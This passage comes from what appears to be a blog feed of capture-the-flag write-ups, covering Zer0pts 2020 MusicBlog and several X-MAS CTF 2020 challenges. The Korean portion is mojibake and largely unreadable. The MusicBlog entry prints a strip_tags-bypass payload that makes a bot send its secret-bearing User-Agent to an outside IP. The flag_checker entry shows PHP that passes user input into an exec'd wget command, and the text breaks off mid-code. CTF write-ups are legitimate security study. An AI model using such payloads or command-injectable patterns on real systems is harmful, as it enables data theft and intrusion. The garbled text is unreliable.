í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•´ì„œ ë„˜ê²¨ì£¼ë‹ˆ ì˜ ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</p><p>ë‹¤ì‹œ í’€ì–´ ë” ì •í™•í•œ í’€ì´ë¥¼ ë‚¨ê¸°ê² ìŠµë‹ˆë‹¤.</p><hr><h2 id="Web-MusicBlog-653pts"><a href="#Web-MusicBlog-653pts" class="headerlink" title="(Web) MusicBlog [653pts]"></a>(Web) MusicBlog [653pts]</h2><p>MusicBlog ë¬¸ì œëŠ” ë”±íˆ ì·¨ì•½ì  ë¶„ë¥˜ë¥¼ í•˜ê¸°ëŠ” í˜ë“¤ê³ , ê·¸ëƒ¥ ì›¹ ì„œë¹„ìŠ¤ ë¡œì§ ê²°í•¨ì„ ì´ìš©í•´ ê³µê²©í•˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤. ì¼ë‹¨ ì†ŒìŠ¤ ì½”ë“œê°€ ë§ì•„ ë¡œì§ì´ ì–´ë–¤ ì‹ìœ¼ë¡œ ëŒì•„ê°€ëŠ” ì§€ë¶€í„° í™•ì¸ì„ í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/1.png?raw=true"><br><br>íšŒì› ê°€ì…ì„ í•˜ê³ , ë¡œê·¸ì¸ì„ í•˜ë©´ Postë¥¼ ì‘ì„±í•˜ëŠ” ê¸°ëŠ¥ê³¼ Postë¥¼ ë³´ëŠ” ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/2.png?raw=true"><br>Postë¥¼ ì‘ì„±í•´ì£¼ë‹ˆ ì´ìƒí•œ ì ì€ <code>ì¢‹ì•„ìš”</code>ë¥¼ ëˆŒëŸ¬ì£¼ì§€ ì•Šì•˜ëŠ”ë° <code>ì¢‹ì•„ìš”</code>ê°€ í•˜ë‚˜ ì°íŒ ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. ì•„ë§ˆ Postê°€ ìƒˆë¡œ ìƒì„±ì´ ë˜ë©´ ì¢‹ì•„ìš”ê°€ ìë™ìœ¼ë¡œ ì°íˆëŠ” ë¡œì§ì´ ìˆëŠ” ê±° ê°™ìŠµë‹ˆë‹¤. ë” ìì„¸í•œ ë‚´ìš©ì„ í™•ì¸í•˜ê¸° ìœ„í•´ì„œ ì½”ë“œë¥¼ ë¶„ì„í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><p><span style="color:#631F9C">&#62;</span> post.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(ìƒëµ)</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">            &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">            &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>â™¥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>â™¥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>post.phpë¥¼ ë³´ë©´ contentì˜ ê°’ì„ render_tags() í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ê²€ì¦ì„ í•˜ê³  ì¶œë ¥í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><span style="color:#631F9C">&#62;</span> util.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [[URL]] â†’ &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>util.phpë¥¼ ë³´ë©´ render_tags() í•¨ìˆ˜ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. preg_replace() í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ &#91;&#91;ULR&#93;&#93;ì´ë¼ëŠ” ê°’ì´ ë“¤ì–´ì˜¤ë©´ &lt;audio&gt;ë¡œ ë³€í™˜ì‹œì¼œì£¼ê³ , strip_tags() í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ audio íƒœê·¸ë§Œ í—ˆìš©í•˜ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ strip_tags() í•¨ìˆ˜ì—ì„œ ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/3.png?raw=true"><br>ìœ„ ì‚¬ì§„ì„ ë³´ë©´ <code>&lt;a/udio&gt;</code>ë¼ëŠ” ë¬¸ìì—´ì´ ë“¤ì–´ì™€ë„ <code>&lt;audio&gt;</code>ë¡œ ì¸ì‹ì„ í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¤‘ê°„ì— ìŠ¬ë˜ì‰¬ê°€ ë“¤ì–´ì™€ë„ ë™ì¼í•˜ê²Œ ì¸ì‹ì„ í•©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ì„œ ì˜¤ë””ì˜¤ íƒœê·¸ ì™¸ì— a íƒœê·¸ë„ ì‚¬ìš©ì„ í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><span style="color:#631F9C">&#62;</span> worker.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ì•„ê¹Œ Postë¥¼ ìƒì„±í•˜ë©´ <code>ì¢‹ì•„ìš”</code>ê°€ í•˜ë‚˜ ì°íˆëŠ” ê²ƒì„ í™•ì¸í–ˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ í•´ë‹¹ ë¡œì§ì„ ì°¾ì•„ë³´ë‹ˆ wocker.jsì— crawlë¡œ ì •ì˜ë¥¼ í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.  ìœ„ ì½”ë“œëŠ” Postê°€ ìƒì„±ì´ ë˜ë©´ <code>User-Agent</code>ì˜ ê°’ìœ¼ë¡œ <code>FLAG</code>ë¥¼ ë„£ê³ , id ê°’ì´ likeì¸ ë²„íŠ¼ì„ í´ë¦­í•´ì„œ <code>ì¢‹ì•„ìš”</code>ë¥¼ ëˆŒëŸ¬ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><span style="color:#631F9C">&#62;</span> init.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; script-src &#x27;nonce-$&#123;nonce&#125;&#x27; &#x27;strict-dynamic&#x27;; base-uri &#x27;none&#x27;; trusted-types&quot;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ XSSë¥¼ ì´ìš©í•´ì„œ User-Agent ê°’ì„ ê°€ì ¸ì™€ì•¼ í•˜ë‚˜ ìƒê°ì„ í–ˆì§€ë§Œ ìœ„ì™€ ê°™ì´ CSPê°€ ê±¸ë ¤ ìˆì–´ ë¶ˆê°€ëŠ¥í•´ë³´ì˜€ìŠµë‹ˆë‹¤,, í•˜ì§€ë§Œ ì•„ê¹Œ util.phpì˜ render_tags() í•¨ìˆ˜ì—ì„œ strip_tags() í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì„œ íƒœê·¸ë¥¼ ê²€ì¦í•˜ê³  ìˆì—ˆëŠ”ë° ì´ë•Œ í•¨ìˆ˜ë¥¼ ìš°íšŒí•´ì„œ a íƒœê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><p>ê·¸ëŸ¼ contentì˜ ê°’ìœ¼ë¡œ â€œ&#60;a id=â€™likeâ€™ href=â€™myipâ€™&#62;&#60;/a&#62;â€ë¥¼ ì£¼ë©´ click(â€˜#likeâ€™)ì— ì˜í•´ì„œ User-Agentì— FLAGê°€ ë“¤ì–´ìˆëŠ” ìƒíƒœë¡œ myipë¡œ ìš”ì²­ì´ ê°ˆ ê²ƒ ì…ë‹ˆë‹¤.</p><p><span style="color:#631F9C">&#62;</span> Exploit</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/4.png?raw=true"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio id=&quot;like&quot; href=&quot;http://141.164.52.207:12345&quot;&gt;GG<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ ìœ„ í˜ì´ë¡œë“œë¥¼ <code>Content</code>ì˜ ê°’ìœ¼ë¡œ ë„˜ê²¨ì£¼ë‹ˆ ìš”ì²­ì´ ë‚´ ì„œë²„ë¡œ ì „ì†¡ì´ ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆê³ , User-Agent í—¤ë”ì˜ flagê°€ ìˆëŠ” ê²ƒë„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><blockquote><p>FLAG : zer0pts{M4sh1m4fr3sh!!}</p></blockquote><hr><h3 id="Web-phpNantoKaAdmin-755pts"><a href="#Web-phpNantoKaAdmin-755pts" class="headerlink" title="(Web) phpNantoKaAdmin [755pts]"></a>(Web) phpNantoKaAdmin [755pts]</h3><p>ê·€ì°®ë‹¤.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Python Pickle RCE </tag>
            
            <tag> REDIS </tag>
            
            <tag> Client Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-MAS CTF 2020 Write Up</title>
      <link href="2020/12/19/2020-12-19-X-MAS-CTF-2020/"/>
      <url>2020/12/19/2020-12-19-X-MAS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>This is the first X-MAS CTF to start studying web security and it was much more fun than I thought. Letâ€™s write a Write Up of interesting problems while solving problems in this CTF.</p><p>This time, I participated in CTF by collaborating with <span style="color:blue"><code>Einstrasse</code></span>. If you want to see eineâ€™s Write Up, you can go <a href="https://eine.tistory.com/entry/Xmas-CTF-2020-write-ups-focus-on-web-challs?category=826774">here</a>!</p><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/main.png?raw=true"></p><hr><h2 id="Programming-Least-Greatest-50-pts"><a href="#Programming-Least-Greatest-50-pts" class="headerlink" title=" (Programming) Least Greatest [50 pts]"></a><span style="color:#21C587"></span> (Programming) Least Greatest [50 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/1.png?raw=true"><br>This time, we will solve the programming problems from X-MAS CTF 2020. The problem was solved easily because <code>eine</code> analyzed the algorithm.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/2.png?raw=true"><br>If you connect with nc, you can see that gcd, lcm numbers are given. Here, the number of factors obtained by decomposing the lcm/gcd value by 2^N is given to the next step.</p><p>It is said that you can do this a total of 100 times, but the time should be within 90 seconds. So I just used Python to write the code and return it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;challs.xmas.htsp.ro&quot;</span>, <span class="number">6050</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;1/100\n&quot;</span>).strip().split()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">_count</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(_count):</span><br><span class="line">        num = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        num1 = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        print(<span class="string">&quot;gcd(x, y) : &quot;</span> + num)</span><br><span class="line">        print(<span class="string">&quot;lcm(x, y) : &quot;</span> + num1)</span><br><span class="line">        s_num = <span class="built_in">int</span>(<span class="built_in">int</span>(num1)//<span class="built_in">int</span>(num))</span><br><span class="line">        cmd = <span class="string">&quot;yafu-x64 factor(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s_num)</span><br><span class="line">        out = subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">        check = out.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        length = check.count(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            data.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">            data[j] = check.split(<span class="string">&#x27;P&#x27;</span>)[i].split(<span class="string">&quot; =&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;ans&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        b = []</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                b.append(data[i])</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>+k,<span class="built_in">len</span>(b)):</span><br><span class="line">                    <span class="keyword">if</span> b[j] != data[i]:</span><br><span class="line">                        b.append(data[i])</span><br><span class="line">                        k += <span class="number">1</span>           </span><br><span class="line">        Count = <span class="built_in">len</span>(b)</span><br><span class="line">        count = <span class="number">2</span>**Count</span><br><span class="line">        print(<span class="string">&quot;Round : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">        print(r.recvline())</span><br><span class="line">        r.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    go(<span class="number">100</span>)</span><br><span class="line">    print(r.recv())</span><br></pre></td></tr></table></figure><p>I wrote the exploit code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/3.png?raw=true"><br>When I returned the exploit code, I could see the flag appear.</p><blockquote><p>FLAG : X-MAS{gr347es7_c0mm0n_d1v1s0r_4nd_l345t_c0mmon_mult1pl3_4r3_1n73rc0nn3ct3d}</p></blockquote><hr><h2 id="Web-PHP-Master-33-pts"><a href="#Web-PHP-Master-33-pts" class="headerlink" title=" (Web) PHP Master [33 pts]"></a><span style="color:#21C587"></span> (Web) PHP Master [33 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.00.png?raw=true"></p><p>Solve URL : <code>http://challs.xmas.htsp.ro:3000/?param1=1.0&amp;param2=001</code><br></p><blockquote><p>FLAG : X-MAS{s0_php_m4ny_skillz-69acb43810ed4c42}</p></blockquote><hr><h2 id="Web-flag-checker-59-pts"><a href="#Web-flag-checker-59-pts" class="headerlink" title=" (Web) flag_checker [59 pts]"></a><span style="color:#21C587"></span> (Web) flag_checker [59 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/1.png?raw=truehttps://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/1.png?raw=true"><br>This time, we will solve a problem called <code>flag_checker</code> among web problems in X-MAS CTF 2020.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* flag_checker */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>When it comes to problems, the above PHP source code exists.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Looking at the checkFlag function, it puts a fake flag in a variable called example_flag, and checks whether the character in $flag is in example_flag.</p><p>If any of the values of $flag are not included in example_flag, False is returned.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = 